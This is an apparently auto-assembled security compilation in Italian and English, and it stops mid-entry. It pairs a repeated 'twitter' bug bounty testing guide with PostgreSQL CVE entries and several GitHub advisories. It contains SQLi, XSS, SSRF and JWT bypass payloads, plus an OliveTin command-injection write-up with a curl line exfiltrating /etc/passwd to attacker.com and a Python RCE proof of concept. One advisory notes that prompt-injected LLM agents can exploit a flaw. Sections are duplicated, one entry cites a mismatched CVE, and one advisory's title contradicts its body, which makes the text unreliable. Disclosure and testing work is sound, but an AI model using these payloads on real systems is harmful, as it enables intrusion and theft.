titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

titolo: CVE-2026-116303: Missing authorization in PostgreSQL type conversion allows a database user to invoke a cast function...
descrizione: Missing authorization in PostgreSQL type conversion allows a database user to invoke a cast function despite lacking EXECUTE privilege on that function, via foreign keys, to_json(), and others.  A successful attack requires the attacker to search each database for access-restricted cast functions and identify confidentiality impact specific to each function implementation found.  There are few or no practical examples of an access-restricted cast function or of a cast function having confidentiality impact.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

steps: Identifica tutte le superfici di input/output
Mappa flusso dati end-to-end
Testa ogni input con fuzzing (boofuzz, radamsa)
Verifica configurazioni di default e credenziali
Documenta ogni anomalia con PoC riproducibile

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su CVE-2026-116313
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

titolo: CVE-2026-116314: Improper input validation in PostgreSQL pg_restore allows a non-plain archive provider to execute ar...
descrizione: Improper input validation in PostgreSQL pg_restore allows a non-plain archive provider to execute arbitrary code as the operating system user running pg_restore, via a crafted archive.  Note a contrast: crafted archive data may legitimately cause arbitrary SQL to execute at the restore destination, but it does not legitimately confer arbitrary code execution in the pg_restore OS process.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

titolo: CVE-2026-116316: Improper protection of alternate path in PostgreSQL security-restricted operations allows an object ...
descrizione: Improper protection of alternate path in PostgreSQL security-restricted operations allows an object creator to execute arbitrary SQL as the operation's caller, via a domain, enum, or range type created in pg_temp.  The victim session must later run a query containing an unqualified type name, e.g. "SELECT '1'::bigint"; autovacuum and other common security-restricted operation users do not do so, so they are unaffected.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

titolo: GHSA-cvx8-9ff6-54xq: PGPainless: Unbounded Compressed Packet Descent in inline-detach and MessageInspector leads to Denial of Service (DoS)
descrizione:
### Summary
An architectural security boundary bypass in inline-detach and MessageInspector allows remote, unauthenticated attackers to force unbounded recursive decompression routines. By supplying a specially crafted OpenPGP message containing deeply nested compressed packet structures, an attacker can completely bypass the library's built-in DoS protections (MAX_LAYER_DEPTH = 16), leading to resource exhaustion, thread blocking, and potential Out-of-Memory (OOM) application crashes.

### Details
The pg-painless core processing pipeline implements a defensive threshold constraint to prevent decompression bomb sequences (Zip Bombs) and arbitrary resource consumption:

    Enforcement Location: pgpainless-main/pgpainless-core/src/main/kotlin/org/pgpainless/decryption_verification/MessageMetadata.kt

    Threshold Constant: MAX_LAYER_DEPTH = 16

However, a code architecture review revealed two specific packet-walking implementations that unpack and step through PGPCompressedData packets manually, entirely failing to track or increment a layer depth index counter against the static compliance limits:

    In InlineDetachImpl.kt (Line ~78-93): The logic loops over data packets via compressedData.dataStream. Because it processes the incoming data block-by-block without leveraging or passing constraints down to the guarded OpenPgpMessageInputStream tracking mechanism, it accepts infinite nesting.

    In MessageInspector.kt (Line ~95): The inspector utility descends recursively down nested compressed packet layouts to ascertain inner content classification markers (e.g., determining encryption states) without referencing or respecting maximum layer depth boundaries.

### PoC
The vulnerability can be verified by constructing an inline-signed binary message wrapped recursively inside multiple layers of compression packets:

    Generate a standard, valid OpenPGP public/private keypair.

    Sign a plaintext document sample utilizing binary inline-signing configurations (.noArmor()).

    Programmatically loop 64 times over the output payload. In each iteration, encapsulate the previous binary output into a new PGPCompressedDataGenerator context configured with CompressionAlgorithmTags.ZIP.

    Pass the final 64-layer nested byte array stream directly to the SOP interface via sop.inlineDetach().message(nestedBytes).toByteArrayAndResult().

Observed Result: The library completely parses the highly nested structures, returning a successful outcome without raising any execution constraints. The code fails to throw the expected SOPGPException.BadData, proving that the 16-layer boundary constraint was completely bypassed during the streaming packet loop.

### Impact

Who is impacted: Any downstream application, gateway, or mail client (such as FlowCrypt or any framework integrating the library's SOP wrapper interface/MessageInspector modules) that handles untrusted, incoming external user files or signed attachment streams. An attacker can use this behavior to systematically freeze application threads, exhaust target heap allocation metrics, and disrupt backend infrastructure services.

titolo: GHSA-2m9m-6cr5-9x25: mssql-mcp-core: SQL injection in mssql-mcp write tools via unparameterized table names and WHERE clauses
descrizione:
Several tools in `mssql-mcp-core` built T-SQL by string-interpolating caller-supplied identifiers and predicates directly into the statement passed to the node-mssql `Request.query()` batch API. Only data values were parameterized.

Affected tools and inputs:
- `update_data`, `delete_data`: `tableName` and the free-form `whereClause` were interpolated raw.
- `insert_data`: `tableName` and column names (object keys) were interpolated raw.
- `execute_transaction`: the same raw `tableName`/`whereClause` interpolation per operation.
- `create_table`, `create_index`, `drop_table`: table/column/index/schema identifiers were interpolated with no or insufficient validation.
- `list_databases` (reader tier): the `stateFilter` argument was interpolated raw into the query, with only a non-enforced inputSchema enum guarding it.

The only check on `whereClause` was that it was non-empty. Because the row-count and preview queries run before the `confirmUpdate`/`confirmDelete` step, a malicious `whereClause` or `tableName` executed on the first call, bypassing the preview/confirmation and `maxRows` safety controls. `Request.query()` submits a multi-statement T-SQL batch, so a crafted input enabled stacked statements (arbitrary DDL/DML), sub-selects, and (with a privileged login and `xp_cmdshell` enabled) OS command execution. Because `list_databases` is a read-only tool, the `stateFilter` sink makes the reader package injectable as well.

## Impact

An actor who can supply tool arguments (a malicious or compromised MCP client, or an LLM agent steered via indirect prompt injection) could read, modify, or drop arbitrary data, bypass the `read_data` allow/deny validation and the preview/confirmation/`maxRows` safeguards, and conditionally achieve OS command execution.

## Patches

Fixed in `@connorbritain/mssql-mcp-core` 0.6.0:
- All identifiers are validated against a strict allowlist and bracket-quoted via a shared helper.
- The free-form `whereClause` string parameter is removed (breaking change) and replaced with structured, parameterized filters (`{ column, operator, value }`) using an operator allowlist. Values are always bound, never interpolated.
- `list_databases` validates `stateFilter` against a fixed allowlist before use.

Upgrade the consumer packages: `mssql-mcp-reader` 0.5.0, `mssql-mcp-writer` 0.5.0, `mssql-mcp-server` 0.6.0 (all depend on core `^0.6.0`).

## Workarounds

Upgrading is the only complete fix; the `list_databases` (`stateFilter`) sink is reachable even under `READONLY=true` and in the reader package. As defense in depth, run the server under a least-privilege SQL login with `xp_cmdshell` disabled, and restrict which MCP clients can invoke the tools.

titolo: GHSA-8fh7-7q4q-cq52: Miren Runtime: Authentication bypass in RPC layer: unverified TLS client certificates grant cluster superuser access
descrizione:
### Summary

  The Miren Runtime RPC server (QUIC/HTTP3, default port `:8443`) requested TLS
  client certificates but never verified that a presented certificate chained to
  the cluster Certificate Authority. Because a client-certificate identity is
  granted a blanket RBAC bypass, any party able to reach the RPC listener could
  present a forged, self-signed certificate and be authenticated as a cluster
  **superuser** — no valid CA signature, credential, or prior authorization
  required.

### Impact

  This is a complete, unauthenticated authentication bypass against the cluster
  control plane. An attacker who can reach the RPC port can perform any RPC
  operation with full privileges: enumerate and manipulate entities, apps,
  sandboxes, disks, and other cluster resources. This yields full compromise of
  confidentiality, integrity, and availability of the cluster and everything it
  orchestrates.

  Exposure is network-reachability–gated only. Deployments that expose `:8443`
  beyond a trusted network (e.g. `0.0.0.0/0`) are remotely exploitable from the
  internet by anyone; deployments that restrict `:8443` to a trusted network are
  exploitable by any party with access to that network.

Due to a lack of ability to detect if the RPC has been accessed unauthorized,
Miren recommends that all applications are redeployed and any credentials reference
in environment variables are rotated. A read-only script to help review standing access,
recent changes, and the exact secrets to rotate is available at https://github.com/mirendev/runtime/tree/089582a132f7fc1e1d5b5c0aee1e0911535fed53/scripts/security/audit-exposure.


### Details

  Three independent factors combined to produce the bypass:

  1. **The listener never verified the client-certificate chain.** When a cluster
     CA was configured, the RPC listener used `tls.RequestClientCert`, which
     requests a client certificate but does not verify it against the configured
     `ClientCAs`. `tls.ConnectionState.VerifiedChains` was therefore always empty,
     and no `VerifyPeerCertificate`/`VerifyConnection` hook re-checked the chain.

  2. **The authenticator derived identity from an unverified certificate.** The
     RPC authenticators read `PeerCertificates[0].Subject.CommonName` directly as
     the caller identity, with method `cert`, without checking that the chain had
     been verified.

  3. **Authorization granted a blanket bypass to certificate identities.** The
     authorizer returned "allowed" for any `cert`-method identity, skipping all
     RBAC checks.

  Go's TLS client only presents a certificate whose issuer Distinguished Name
  matches a CA advertised by the server, but that comparison is on the (public,
  non-secret) DN bytes only — it does not require a valid signature from the CA.
  An attacker can therefore mint a self-signed certificate whose **issuer DN is
  byte-identical to the cluster CA subject**, signed with an attacker-controlled
  key. The stock client presents it, and the vulnerable server accepts it and
  trusts its CommonName as a superuser identity.

### Patches

  Fixed by verifying the client-certificate chain before trusting it:

  - The listener now uses `tls.VerifyClientCertIfGiven` when a cluster CA is
    configured. A presented certificate must chain to the configured CA to
    complete the handshake, while certless callers (JWT/OIDC, which authenticate
    via the `Authorization` header) are still admitted.
  - As defense in depth, both RPC authenticators now require a non-empty
    `VerifiedChains` before deriving an identity from a client certificate.

  Users should upgrade to the patched release and restart the server so the
  new listener configuration takes effect.

### Workarounds

  Until the patch is deployed, restrict network access to the RPC port (`:8443`)
  so that it is not reachable from untrusted networks — remove any
  `0.0.0.0/0` ingress and limit it to trusted management networks. This is a
  containment measure only and does not remove the underlying vulnerability.

titolo: GHSA-vc6p-m6vx-6cwq: OliveTin: Second-Order OS Command Injection via shellAfterCompleted
descrizione:
## Summary

OliveTin's `shellAfterCompleted` post-execution hook injects unsanitized variables — including arbitrary command output (`output`), the authenticated username (`ot_username`), and the exit code (`exitCode`) — directly into a shell command template processed by `sh -c`. Unlike the main action's argument handling, **no `checkShellArgumentSafety` validation is applied** to these variables. An attacker who can influence the output of a command (e.g., via user-supplied arguments that reflect in stdout, or through trusted-header username spoofing) can inject arbitrary OS commands into the post-execution shell.

This is a **distinct** finding from CVE-2026-27626 (OS command injection via `password` type in webhooks). That CVE addressed argument types bypassing shell safety checks in the primary execution step. This vulnerability exists in the **post-execution step** (`stepExecAfter`), which has **zero** safety checks on any of its template variables.

## Affected Versions

- All versions containing `shellAfterCompleted` functionality (current codebase through latest)

## Details

### Vulnerable Code Path

In `service/internal/executor/executor.go`, the `stepExecAfter` function handles post-execution commands:

```go
func stepExecAfter(req *ExecutionRequest) bool {
    if req.Binding.Action.ShellAfterCompleted == "" {
        return true
    }

    // These variables are injected WITHOUT any type checking or sanitization
    args := map[string]string{
        "output":                 req.logEntry.Output,           // Arbitrary command stdout/stderr
        "exitCode":               fmt.Sprintf("%v", req.logEntry.ExitCode),
        "ot_executionTrackingId": req.TrackingID,
        "ot_username":            req.AuthenticatedUser.Username, // User-controlled via trusted headers
    }

    // Template rendered with unsanitized args
    finalParsedCommand, err := tpl.ParseTemplateWithActionContext(
        req.Binding.Action.ShellAfterCompleted,
        req.Binding.Entity,
        args,
    )

    // Directly passed to sh -c — NO safety check
    cmd := wrapCommandInShell(ctx, finalParsedCommand)
    // ...
}
```

The `wrapCommandInShell` function (in `executor_unix.go`) executes:

```go
func wrapCommandInShell(ctx *ExecutionContext, finalParsedCommand string) *exec.Cmd {
    return exec.CommandContext(ctx, "sh", "-c", finalParsedCommand)
}
```

### Why This Bypasses Existing Protections

The main action's shell commands go through `checkShellArgumentSafety` (called from `handleShellBranch` at line 693 of executor.go), which blocks dangerous argument types like `password`, `url`, `email`, `raw_string_multiline`, and `very_dangerous_raw_string` from shell mode.

**`stepExecAfter` calls none of these checks.** The `output` variable is:
- Not a declared argument with a type — it's internally created
- Not validated against any regex or type system
- Not passed through `checkShellArgumentSafety`
- Directly interpolated into a shell command template

A `grep` for `checkShellArgumentSafety` in the codebase confirms it is **only** invoked at one location:

```
executor.go:693: if err := checkShellArgumentSafety(req); err != nil {
```

This is inside `handleShellBranch` (the primary action execution), **not** in `stepExecAfter`.

### Injection Vectors

#### Vector 1: Output Reflection

If a primary action echoes user-controlled input:

```yaml
actions:
  - title: Lookup User
    shell: "echo 'User: {{ .Arguments.username }}'"
    shellAfterCompleted: "audit-log '{{ .Arguments.output }}'"
    arguments:
      - name: username
        type: ascii_identifier
```

While `ascii_identifier` constrains the direct argument, the command output itself is the injection vector. If the action processes external data (files, APIs, databases) and that data contains shell metacharacters, the output flows unsanitized into `shellAfterCompleted`.

#### Vector 2: Exec Mode Output Injection

Actions using `exec` mode (array form) safely handle arguments in the primary command but the **output** still flows to `shellAfterCompleted` through a shell:

```yaml
actions:
  - title: Read External Data
    exec:
      - cat
      - /shared/data/{{ .Arguments.filename }}
    shellAfterCompleted: "process-result '{{ .Arguments.output }}'"
    arguments:
      - name: filename
        type: ascii_identifier
```

If `/shared/data/report` contains text like:
```
'; curl http://attacker.com/exfil?data=$(cat /etc/passwd) #
```

The `shellAfterCompleted` becomes:
```bash
process-result ''; curl http://attacker.com/exfil?data=$(cat /etc/passwd) #'
```

This executes arbitrary commands as the OliveTin process user.

#### Vector 3: Username Injection via Trusted Headers

When trusted header authentication is used (see Finding 04), the `ot_username` variable comes directly from an HTTP header with no sanitization:

```yaml
actions:
  - title: Any Action
    shell: "echo ok"
    shellAfterCompleted: "logger 'Action completed by {{ .Arguments.ot_username }}'"
```

An attacker sets:
```
X-Remote-User: '; id > /tmp/pwned #
```

The `shellAfterCompleted` becomes:
```bash
logger 'Action completed by '; id > /tmp/pwned #'
```

This chains Findings 04 and 05: trusted header spoofing enables username-based injection into post-execution commands.

## PoC

### Prerequisites

- OliveTin instance with an action configured with `shellAfterCompleted`
- The `shellAfterCompleted` template references `{{ .Arguments.output }}` or `{{ .Arguments.ot_username }}`

### Config

```yaml
listenAddressSingleHTTPFrontend: 0.0.0.0:1337
logLevel: "DEBUG"
checkForUpdates: false

actions:
  - title: Process File
    id: process-file
    exec:
      - cat
      - "/tmp/olivetin-data/{{ .Arguments.filename }}"
    shellAfterCompleted: "echo '{{ .Arguments.output }}' >> /tmp/olivetin-audit.log"
    arguments:
      - name: filename
        type: ascii_identifier
```

### Step 1: Create a malicious data file

```bash
# On the server, create a file with shell injection payload
mkdir -p /tmp/olivetin-data
echo "normal_data'; touch /tmp/PWNED; echo '" > /tmp/olivetin-data/report
```

### Step 2: Execute the action normally

```bash
curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -d '{"bindingId":"process-file","arguments":[{"name":"filename","value":"report"}]}'
```

### Step 3: Verify injection

```bash
ls -la /tmp/PWNED
# If the file exists, the injection was successful
```

**Explanation**: The `cat` command (exec mode) safely reads the file. The output `normal_data'; touch /tmp/PWNED; echo '` is captured. Then `shellAfterCompleted` renders:
```bash
echo 'normal_data'; touch /tmp/PWNED; echo '' >> /tmp/olivetin-audit.log
```
This executes `touch /tmp/PWNED` as a second command.

### Step 4: Username injection (with trusted headers)

```yaml
# Add to config
authHttpHeaderUsername: "X-Remote-User"
```

```bash
curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H 'Content-Type: application/json' \
  -H "X-Remote-User: test'; touch /tmp/PWNED2; echo '" \
  -d '{"bindingId":"some-action","arguments":[]}'
```

If `shellAfterCompleted` uses `{{ .Arguments.ot_username }}`, the injection executes.

### Python PoC

```python
#!/usr/bin/env python3
"""PoC: Second-Order Command Injection via shellAfterCompleted output variable.

Distinct from CVE-2026-27626 (password type injection in primary execution).
This exploits the post-execution step which has zero argument safety checks.
"""

import requests
import time
import os

TARGET = "http://127.0.0.1:1337"
BINDING_ID = "process-file"

def setup_payload():
    """Create a data file containing shell injection payload."""
    os.makedirs("/tmp/olivetin-data", exist_ok=True)
    with open("/tmp/olivetin-data/exploit", "w") as f:
        f.write("data'; id > /tmp/rce-proof; echo '")
    print("[+] Created malicious data file")

def trigger_action():
    """Execute the action that reads the malicious file."""
    resp = requests.post(
        f"{TARGET}/api/StartActionAndWait",
        json={
            "bindingId": BINDING_ID,
            "arguments": [{"name": "filename", "value": "exploit"}]
        },
        headers={"Content-Type": "application/json"}
    )
    print(f"[+] Action response: {resp.status_code}")
    return resp.json()

def verify_rce():
    """Check if the injected command executed."""
    time.sleep(2)
    if os.path.exists("/tmp/rce-proof"):
        with open("/tmp/rce-proof") as f:
            print(f"[!] RCE CONFIRMED: {f.read().strip()}")
        return True
    else:
        print("[-] /tmp/rce-proof not found")
        return False

if __name__ == "__main__":
    setup_payload()
    result = trigger_action()
    print(f"[*] Action output: {result}")
    verify_rce()
```

## Impact

- **Remote Code Execution**: Arbitrary commands execute as the OliveTin process user
- **Chained with Finding 04**: Trusted header spoofing enables injection via `ot_username`
- **Bypass of CVE-2026-27626 fix**: The fix for that CVE only addressed `checkShellArgumentSafety` in the primary execution step; the post-execution step was not hardened
- **Exec mode bypass**: Actions using the safe `exec` mode (array form) for the primary command can still be exploited through their output flowing to the shell-based `shellAfterCompleted`

## Remediation

1. **Apply `checkShellArgumentSafety`** (or equivalent) to `stepExecAfter` variables
2. **Shell-escape the `output`, `ot_username`, and `exitCode` values** before template substitution (e.g., using `shellescape.Quote()`)
3. **Consider adding an exec-mode variant** for `shellAfterCompleted` to avoid shell interpretation entirely
4. **Sanitize `ot_username`** to reject shell metacharacters regardless of the auth provider

titolo: GHSA-vf85-8ff2-3r9w: django-filer: Missing per-object authorization on `discard` and `edit_redirect` version transitions
descrizione:
## Summary

When django-filer's optional per-folder permission system is enabled (`FILER_ENABLE_PERMISSIONS=True`), the "Delete files and/or folders" admin action does **not** enforce per-folder edit permissions the way every other mutating action does. A staff user who is scoped **read-only** on a folder via `FolderPermission` (`can_edit = DENY`), but who holds the global Django model-level `delete_*` permission, can delete files and entire subfolders inside that folder — even though their move, rename, copy, and resize actions on the same folder are correctly denied.

This is an integrity / edit-control gap (unauthorized deletion). It is **not** a read-confidentiality issue: filer files are world-downloadable by design, so no confidentiality claim is made.

## Affected versions

- django-filer `<= 3.4.4` (verified end-to-end on 3.4.4 and on `master` prior to   the fix).

Only installations running with `FILER_ENABLE_PERMISSIONS = True` (the optional per-folder `FolderPermission` system) are affected. Deployments that leave permissions disabled (the default) rely solely on Django model-level permissions and are not impacted by this specific gap.

## Patched versions

- Fixed in PR [#1605](https://github.com/django-cms/django-filer/pull/1605).   Upgrade to the first release containing that commit (`3.5.0` or later).

## Details

The `delete_files_or_folders` admin action in `filer/admin/folderadmin.py` authorized deletion using only:

1. `self.has_delete_permission(request)` — which returns `True` for `obj=None`, and
2. the Django model-level `delete_file` / `delete_folder` / `delete_image`    permission (enforced downstream by the admin delete machinery).

It never called `check_folder_edit_permissions` or `check_files_edit_permissions`. Every sibling mutating action — move, rename, copy, resize — *does* call these helpers, which walk the selected objects (and their descendants) and enforce the per-folder `can_edit` grant from `FolderPermission`.

Because `FolderPermission` has no dedicated `can_delete` field, deletion is treated as an edit/management operation and is gated elsewhere on `can_edit`. The delete action's omission therefore let a folder-scoped read-only user bypass the per-folder control that constrains all their other write operations.

### Precondition 

The attacker must hold the Django model-level `delete_file` / `delete_folder` / `delete_image` permission. A purely read-only user (no model-level delete perm) receives `403` and cannot exploit this. This precondition matches the standard folder-scoped-staff deployment model, where staff hold model-level permissions and are further constrained per-folder by `FolderPermission`. 

## Mitigation

- Upgrade to the patched release.
- Until upgrading, avoid granting the model-level `delete_file` /
  `delete_folder` / `delete_image` permission to staff who are meant to be
  read-only on specific folders via `FolderPermission`.

## Credit

Reported through coordinated disclosure. Fixed in PR #1605.

titolo: GHSA-5g9x-qwh5-33x4: djangocms-versioning: Authorization Bypass Through User-Controlled Key and Missing Authorization
descrizione:
## Summary

The `discard` and `edit_redirect` version transitions did not enforce a per-object change-permission check, while the sibling transitions (`archive`, `publish`, `unpublish`, `revert`) all did. As a result a low-privileged staff user could **discard (delete) any draft version — and thereby the underlying content object — of content they have no change permission on**, and could create an editable draft off any published version, by supplying a version primary key they should not have access to (an insecure direct object reference).

## Details

